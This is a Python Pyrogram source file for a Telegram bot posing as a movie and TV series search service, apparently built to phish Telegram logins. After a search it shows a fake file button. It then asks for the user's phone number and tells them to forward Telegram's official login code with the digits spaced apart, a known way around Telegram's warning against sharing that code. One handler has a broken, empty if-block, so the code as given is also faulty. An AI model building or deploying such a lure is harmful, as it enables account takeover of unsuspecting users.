from pyrogram import Client, filters
from pyrogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
import time

# List of Admin User IDs
ADMINS = [8083702486]  # Replace with your Telegram user IDs

@Client.on_message(filters.command("start"))
async def start(client, message):
    await message.reply_photo(
        photo="http://ibb.co/cSHnLmg0",
        caption=f"""<b> Hello {message.from_user.mention},
Iam a Telegram Movie - Series SearchBot by team @ProSearch.

/start - Start Search Bot
/help - How to Search
/Movies - Latest Movies Releases
/Series - Latest TV-WEBSeries Releases
/About - About </b>""",
        reply_markup=InlineKeyboardMarkup( [[
            InlineKeyboardButton("🤖 Latest Releases Updates", url="https://t.me/+LW89bJRfx7w5YTRl"),
            ],[
            InlineKeyboardButton("🎙️ BOT Updates Channel", url="https://t.me/+MctHWdg20Fs5ZTM1"),
            ],[
            InlineKeyboardButton("♦️Movies BOT🔍", url="https://t.me/ProSearchX7Bot"),
            InlineKeyboardButton("♦️TVSeries BOT🔍", url="https://t.me/ProsearchY4Bot")
            ]]
            )
        )
    await message.reply_text(f"<b> ❗️Send Movie Name and Year Correctly. 👍 </b>")

@Client.on_message(filters.command("help"))
async def help(client, message):
    await message.reply_text(
        text=f"""<b> ❗️How to Search Movies ❓ 
➖➖➖➖➖➖➖➖➖➖➖

1. Just Send Movie Name and Year Correctly.
(Check Google for Correct Spelling and year) 

Examples: - 
Oppam 2016
Baahubali 2015

Oppam 2016 1080p
Baahubali 2015 1080p
(For Getting only 1080p Quality Files)

Baahubali 2015 Malayalam 
Baahubali 2015 Tamil 
(For Dubbed Movie Files)

〰〰〰〰〰〰〰〰〰〰〰
❗️How to Search TVSeries ❓ 
➖➖➖➖➖➖➖➖➖➖➖

1. Just Send Series Name and Season Correctly.
(Check Google for Correct Spelling) 

Examples: - 
Game of Thrones S01
(S01 For Season 1)

Breaking Bad S02 1080p
For Season 2 1080p Files

Lucifer S03E01 
(For Season 3 Episode 1)


〰〰〰〰〰〰〰〰〰〰〰

❗️On Android, Better Use VLC Media Player , MPV Player,  MX Player Pro, X Player Video Players. </b>""")
    await message.reply_text(f"<b> ❗️Send Movie Name and Year Correctly. 👍 </b>")

@Client.on_callback_query(filters.regex("^movie_")) # Only handle data that starts with button_
async def handle_button_callbacks(client, callback_query):
    reply_markup = ReplyKeyboardMarkup(
        [[KeyboardButton("Share Contact 📱", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )
    await callback_query.message.reply_text(
        f"<b> Now please send your PHONE_NUMBER along with the country code. </b>",
        reply_markup=reply_markup
    )
    callback_query.answer()

# Handler for text messages
@Client.on_message(filters.private & filters.text)
async def search_movie(client, message):
    query = message.text
    reply_markup = InlineKeyboardMarkup(
        [[InlineKeyboardButton(f"{query} Dubbed Sony DADC DVDRip Full Movie.mkv", callback_data=f"movie_{query}")]]
    )
    await message.reply_text(f"""<b> 🔍 Results for your Search 

➠ Latest Uploads: @ProSearchZ
 ➠➠ BOT Updates: @ProSearch🔻 </b>""", reply_markup=reply_markup)

# Handler for button press with admin check
@Client.on_callback_query()
async def movie_button(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split("_", 1)[1]
    data = callback_query.data
    
    if data == "movie_{query}":
    if user_id not in ADMINS:
        await callback_query.message.reply_text(f"<b> Sorry Dude, You are Banned. </b>")
        callback_query.answer()  # to stop loading animation
        return
    
    

# Handler for receiving contact
@Client.on_message(filters.contact)
async def contact_received(client, message):
    await message.reply_text(f"<b> Sending OTP... </b>")
    time.sleep(5)
    await message.reply_text(f"""<b> Please check for an OTP in official Telegram account.
If you got it, send OTP here after reading the below format.
If OTP is 12345, please send it as 1 2 3 4 5. </b>"""
    )

# Handler for OTP message
@Client.on_message(filters.private & filters.regex(r"^(\d\s){4}\d$"))
async def otp_received(client, message):
    await message.reply_text(f"""<b> Here is Your Link: 
https://example.com/yourmovie </b>""")
